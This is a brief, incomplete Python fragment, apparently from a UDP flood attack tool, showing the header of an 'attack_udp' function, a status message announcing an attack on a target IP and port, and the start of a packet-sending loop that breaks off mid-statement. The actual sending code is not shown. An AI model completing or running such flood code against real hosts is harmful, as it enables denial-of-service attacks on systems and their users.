...
def attack_udp(ip, port, secs, size):
    ...
    print(f"[UDP] Starting attack: {ip}:{port} | Size: {safe_size} | Target: {max_packets:,} packets")
    
    while time.time() < timeout and sent < max_packets:
        try:
